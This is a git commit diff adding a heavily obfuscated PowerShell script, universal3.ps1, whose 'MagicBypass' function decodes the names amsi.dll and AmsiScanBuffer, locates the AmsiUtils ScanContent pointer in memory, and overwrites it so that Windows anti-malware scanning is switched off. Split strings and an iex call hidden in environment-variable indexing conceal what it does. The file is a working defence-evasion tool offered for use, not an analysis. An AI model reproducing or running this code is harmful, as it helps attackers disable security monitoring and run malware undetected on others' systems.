1883166d518b1a9c310b82f73701bf0b54339c00
robertoaguilarfields-blip <robertoaguilarfields@gmail.com>
2025-09-19 23:26:34 -0400

    Add files via upload

--- universal3.ps1
+++ universal3.ps1
@@ -1,125 +1,126 @@
-&('')
-function MagicBypass {
+```
+.( $env:ComspEc[4,24,25]-joIN'') ( (('function MagicBypass {
+    param(
+        jFCIni'+'tialStart = 0x50000,'+'
+        jFCNegativeOffset ='+' 0x50000,
+   '+'     '+'jFCMaxOffset = 0x1000000,'+'
+        jFCReadBytes = 0x50000
+'+'    )
 
-
-param(
-    $InitialStart = 0x50000,
-    $NegativeOffset= 0x50000,
-    $MaxOffset = 0x1000000,
-    $ReadBytes = 0x50000
-)
-
-$APIs = @"
-using System;
-using System.ComponentModel;
+    jFCAP'+'Is = @6wf
+usi'+'ng'+' System;
+using'+' System.Compo'+'nentModel;
 using System.Management.Automation;
-using System.Reflection;
-using System.Runtime.CompilerServices;
-using System.Runtime.InteropServices;
-using System.Text;
+using'+' System.Reflection;
+using Syste'+'m.Runtime.Com'+'pilerService'+'s;
+using System.Runtime.'+'InteropServ'+'ices;
+using'+' System.T'+'ext;
 
-public class APIs {
-    [DllImport("kernel32.dll")]
-    public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, UInt32 nSize, ref UInt32 lpNumberOfBytesRead);
+pu'+'blic class APIs {
+    [DllImport(6wfkernel32.dll6wf)]
+    public '+'static extern boo'+'l ReadProcessMemory(IntPtr hP'+'rocess, IntPtr lpBaseAddress, byte[] lpBuffer, UInt32 nSize, ref'+' UInt32 lp'+'Num'+'ber'+'OfBytesRead);
 
-    [DllImport("kernel32.dll")]
-    public static extern IntPtr GetCurrentProcess();
+    [DllImpo'+'rt(6wfkernel32.dll6wf)]
+    public static exte'+'rn IntPtr GetCurrentProce'+'ss();
 
-    [DllImport("kernel32", CharSet=CharSet.Ansi, ExactSpelling=true, SetLastError=true)]
-    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+    [DllImport(6wfkernel326wf, Cha'+'rSet=CharSet.Ansi, ExactSpe'+'lling=true, SetLastErr'+'or=true)]
+    public st'+'atic extern IntPtr GetProcAddress(IntPtr hModule, string '+'procName);
    
-    [DllImport("kernel32.dll", CharSet=CharSet.Auto)]
-    public static extern IntPtr GetModuleHandle([MarshalAs(UnmanagedType.LPWStr)] string lpModuleName);
+    [DllImport(6wfkernel'+'3'+'2.dll6wf, CharSet=Char'+'Set.Auto)]
+    public static extern IntPtr GetModuleHandle([Mars'+'halAs(UnmanagedType.LPWStr)] string lpModuleName);
 
-    [MethodImpl(MethodImplOptions.NoOptimization | MethodImplOptions.NoInlining)]
-    public static int Dummy() {
-     return 1;
+    '+'[MethodImpl(MethodImplOptio'+'ns.NoOptimization '+'V4j MethodImplOpti'+'ons.NoInlining)]'+'
+    public s'+'tatic i'+'nt Dummy() {
+        return 1;
+ '+'   }'+'
+}'+'
+6wf@
+
+    Add-Type jFCAPIs
+
+'+'    jFCInitialDate = Get-Date
+
+    jFCstring = mryhello, worldmry
+    jFCstring = jFCst'+'ring.re'+'place(mryhemry,mryamry'+')
+    jFCstring = jFCstring.replace(mr'+'yllmry,mrymmry)
+    jFCstring = jFCstr'+'ing.repla'+'ce(mryo,mr'+'y,mrysmry)
+    jFCstring = jFCstring.replace(mry mry,mryimry)
+    jFCstring = jFCstring.replace(mrywomry,mry.dmry)
+    jFCstrin'+'g = jFCstring.replace(mryrldmry,mryllmry)
+
+    jFCstrin'+'g2 = mryhello, worldmry
+    jFCstring2 = jFCstring2.replace(mryhemry,'+'mryAmry)
+    jFCstring2 = '+'jFCstring2.replace(mryllmry,mrymmry)
+    jFCstring2 = jFCst'+'ring2.replace(mryo,mry,mrysmry)
+    jFCstring2 = jFCstring2.r'+'eplace(mry mry,mryimry)
+    j'+'FCstring2 = jFC'+'string2.replace(mrywomry,m'+'ryS'+'cmry)
+    jFCstring2 = jFCstring2.replace(mryrldmry,mryan'+'mry)
+
+    jFCstring3 = m'+'ryhello, worldmry
+    jFCstring3 = j'+'FCstring3.repl'+'ace(mryhellomry,mryBumry)
+    jFCstring3 = jFCstring3.replace(mry, mry,mryffmry)
+    jFCstring3 = jFCstring3.replace(mryworldmry,mryermry)
+
+    jFCAddress = [APIS]::GetModuleHandle(jFCst'+'ring)
+    [IntPtr] jFCfu'+'ncAddr'+' = [APIS]::GetProcAddress(jFCAddress, jFCstring2 + jFCstring3)
+
+    jFCAssemblies = [appdomain]::currentdomain.getassemblies()
+    jFCAssemblies V4j
+        ForEach-Object {
+            if(jFC_.Location -ne jFCnull){
+           '+'  '+'   jFCsplit1 = jFC_.FullName.Split(6wf,'+'6wf)[0]'+'
+               '+' If(jFCsplit1.StartsW'+'ith(mrySmry) -And jFCsplit1.EndsWith(mrynmry) -And jFCsplit1.Length -eq 28) {
+          '+'          jFCTypes = jFC_.GetTypes()
+               '+' }
+            }
+        }
+
+    jFCTypes V4'+'j
+        ForEach-Object {
+            if(jFC_.Name -ne jFCnu'+'ll){
+       '+'         If(jFC_.Name.StartsWith'+'(mryAmry) -And jFC_.Name'+'.EndsWith'+'(mrysmry) -And jFC_.Name.L'+'ength -eq 9) {'+'
+  '+'                  jFCMethods ='+' jFC_.GetMethods([System.Reflectio'+'n.Bi'+'ndin'+'gFlags]mryStatic,NonPublicmry)
+                }
+            }
+        }
+
+    jFCMethods V4j
+        ForEac'+'h-Object {
+            if(jFC_.Name -ne jFCnull){
+    '+'            If(jFC_.Name.StartsWith(mrySmry) -And jFC_.Name.EndsWith(m'+'rytmry) -And j'+'FC_.Name.Length -eq 11) {
+                   '+' j'+'FCMethodFound = '+'jFC_
+       '+'         }
+            }
+        }
+
+    [IntPtr] jFCMeth'+'odPointer = jFCMethodFound.Met'+'hodHandle.Get'+'FunctionPoin'+'ter()
+    [IntPtr'+'] jFCHandle = [API'+'s]::GetCurrentProces'+'s()
+    jFCd'+'ummy = 0
+    jFCApiReturn = jF'+'Cfalse
+
+    :initialloop
+    for(jFCj = jFCInit'+'ialStart; jFCj -lt jFCMax'+'Offset; jFCj += jFCNegativeOffset){
+        [IntPtr] jFCMetho'+'dPointerToSearch = [Int64] jFCMethodPointer - jFCj
+        jFCReadedMemoryArray = [byte[]]::new(jFCRe'+'adBytes)
+        jFCApiReturn = [APIs]::ReadProcessMemory(jF'+'CHandle, jFC'+'MethodPointerToSearch, jFCReadedMemoryArray, jFCReadBytes,[ref]jFCdummy)
+        for (jFCi = 0; jFCi -lt jFC'+'ReadedMemoryAr'+'ray.Leng'+'th; jFCi += 1) {
+            jFCbytes = [byte[]](jFCReadedMemoryArray[jFCi], jFCRe'+'adedMemoryArray[jFCi + 1], jFCReadedMemoryArray[jFCi + 2], jFCReadedMemoryArray[jFCi + 3], jFCReadedMemoryArray[jFCi + 4], jFCReadedMemoryArray[jFCi + 5], jFCReadedMemoryArray[jFCi + 6], jFC'+'ReadedMemoryArray[jFCi + 7])
+      '+'      [IntPtr] jFCPointer'+'ToCompare = [bitconverter]::ToIn'+'t64(jFCbytes,0)'+'
+            if (jFCPointerToCompa'+'r'+'e -eq jFCf'+'uncAddr) {
+               '+' Write-Hos'+'t 6w'+'fFound @ jFC(jFCi)!6wf
+  '+'             '+' [IntPtr]'+' jFCMemoryToPatch = [Int64] '+'jFC'+'M'+'ethodPointerToSearch +'+' jFCi
+                br'+'eak'+' initial'+'loop
+  '+'          }
+   '+'     }
     }
+
+    [IntPtr] jFCDummyPoin'+'ter = [APIs].GetMethod(mryDummy'+'mry).MethodHandle.GetFunctionPointer()
+    jFCbuf = [IntPtr[]] (jFCDummyPointer)
+    [System.Runtime.InteropServices.Marshal]::Copy(jFCbuf, 0, jFCMemoryToPatch, 1)
+
+    jFCFinishDate = Get-Date
+    j'+'FCTimeElapsed = '+'(jFCFinishD'+'ate - jFCInitialDate).TotalSeconds
+    Write-Host 6wfjFCTim'+'eElapsed seconds6wf
 }
-"@
-
-&("{2}{0}{1}" -f'T','ype','Add-') $APIs
-
-$InitialDate=&("{0}{1}"-f 'Ge','t-Date');
-
-$string = ("{1}{0}{2}"-f 'llo, ','he','world')
-$string = $string.replace('he','a')
-$string = $string.replace('ll','m')
-$string = $string.replace('o,','s')
-$string = $string.replace(' ','i')
-$string = $string.replace('wo','.d')
-$string = $string.replace('rld','ll')
-
-$string2 = ("{2}{1}{0}"-f 'orld','w','hello, ')
-$string2 = $string2.replace('he','A')
-$string2 = $string2.replace('ll','m')
-$string2 = $string2.replace('o,','s')
-$string2 = $string2.replace(' ','i')
-$string2 = $string2.replace('wo','Sc')
-$string2 = $string2.replace('rld','an')
-
-$string3 = ("{1}{0}{2}{3}"-f'wo','hello, ','rl','d')
-$string3 = $string3.replace(("{1}{0}"-f 'ello','h'),'Bu')
-$string3 = $string3.replace(', ','ff')
-$string3 = $string3.replace(("{0}{1}" -f'wor','ld'),'er')
-
-$Address = [APIS]::GetModuleHandle($string)
-[IntPtr] $funcAddr = [APIS]::GetProcAddress($Address, $string2 + $string3)
-
-$Assemblies = [appdomain]::currentdomain.getassemblies()
-$Assemblies |
-  .("{1}{2}{4}{3}{0}"-f'ct','For','Ea','je','ch-Ob') {
-    if($_.Location -ne $null){
-     $split1 = $_.FullName.Split(",")[0]
-     If($split1.StartsWith('S') -And $split1.EndsWith('n') -And $split1.Length -eq 28) {
-       $Types = $_.GetTypes()
-     }
-    }
-}
-
-$Types |
-  &("{0}{3}{2}{1}{4}" -f'For','bjec','O','Each-','t') {
-    if($_.Name -ne $null){
-     If($_.Name.StartsWith('A') -And $_.Name.EndsWith('s') -And $_.Name.Length -eq 9) {
-       $Methods = $_.GetMethods([System.Reflection.BindingFlags]("{2}{3}{0}{1}" -f'c,NonPub','lic','Stat','i'))
-     }
-    }
-}
-
-$Methods |
-  &("{2}{0}{1}" -f'Obj','ect','ForEach-') {
-    if($_.Name -ne $null){
-     If($_.Name.StartsWith('S') -And $_.Name.EndsWith('t') -And $_.Name.Length -eq 11) {
-       $MethodFound = $_
-     }
-    }
-}
-
-[IntPtr] $MethodPointer = $MethodFound.MethodHandle.GetFunctionPointer()
-[IntPtr] $Handle = [APIs]::GetCurrentProcess()
-$dummy = 0
-$ApiReturn = $false
-   
-:initialloop for($j = $InitialStart; $j -lt $MaxOffset; $j += $NegativeOffset){
-    [IntPtr] $MethodPointerToSearch = [Int64] $MethodPointer - $j
-    $ReadedMemoryArray = [byte[]]::new($ReadBytes)
-    $ApiReturn = [APIs]::ReadProcessMemory($Handle, $MethodPointerToSearch, $ReadedMemoryArray, $ReadBytes,[ref]$dummy)
-    for ($i = 0; $i -lt $ReadedMemoryArray.Length; $i += 1) {
-     $bytes = [byte[]]($ReadedMemoryArray[$i], $ReadedMemoryArray[$i + 1], $ReadedMemoryArray[$i + 2], $ReadedMemoryArray[$i + 3], $ReadedMemoryArray[$i + 4], $ReadedMemoryArray[$i + 5], $ReadedMemoryArray[$i + 6], $ReadedMemoryArray[$i + 7])
-     [IntPtr] $PointerToCompare = [bitconverter]::ToInt64($bytes,0)
-     if ($PointerToCompare -eq $funcAddr) {
-       .("{1}{0}{2}"-f 'ite-Hos','Wr','t') "Found @ $($i)! "
-       [IntPtr] $MemoryToPatch = [Int64] $MethodPointerToSearch + $i
-       break initialloop
-     }
-    }
-}
-[IntPtr] $DummyPointer = [APIs].GetMethod(("{1}{0}"-f'y','Dumm')).MethodHandle.GetFunctionPointer()
-$buf = [IntPtr[]] ($DummyPointer)
-[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $MemoryToPatch, 1)
-
-$FinishDate=&("{0}{1}" -f 'G','et-Date');
-$TimeElapsed = ($FinishDate - $InitialDate).TotalSeconds;
-&("{0}{1}{2}{3}"-f'W','r','ite-H','ost') ("$TimeElapsed "+'second'+'s')
-}
-.()
+') -ReplacE'mry',[cHAr]39  -ReplacE([cHAr]54+[cHAr]119+[cHAr]102),[cHAr]34-cREplaCE'jFC',[cHAr]36 -cREplaCE  'V4j',[cHAr]124))
+```
